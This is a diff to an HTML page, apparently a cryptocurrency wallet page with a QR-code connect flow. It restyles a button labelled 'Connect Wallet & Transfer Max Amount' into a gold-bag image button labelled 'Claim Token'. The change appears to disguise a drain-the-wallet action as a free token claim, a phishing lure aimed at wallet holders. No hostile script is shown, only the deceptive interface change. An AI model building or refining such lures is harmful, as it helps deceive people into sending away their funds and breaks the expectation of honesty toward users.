@@ -16,9 +16,27 @@
             height: 100vh;
             background-color: #f0f0f0;
         }
-        button {
-            padding: 15px 25px;
+        .gold-bag-button {
+            background: url('https://i.imgur.com/xzA6k2P.png') no-repeat center center;
+            background-size: cover;
+            width: 150px;
+            height: 150px;
+            border: none;
+            cursor: pointer;
+            color: #fff;
             font-size: 16px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-shadow: 1px 1px 2px #000;
+        }
+        .gold-bag-button span {
+            position: relative;
+            top: 60%;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 5px 10px;
+            border-radius: 5px;
         }
         #qrCodeContainer {
             display: none;
@@ -31,7 +49,7 @@
     </style>
 </head>
 <body>
-    <button id="connectButton">Connect Wallet & Transfer Max Amount</button>
+    <button id="connectButton" class="gold-bag-button"><span>Claim Token</span></button>
 
     <div id="qrCodeContainer">
         <h2>Scan QR Code with Your Wallet App</h2>
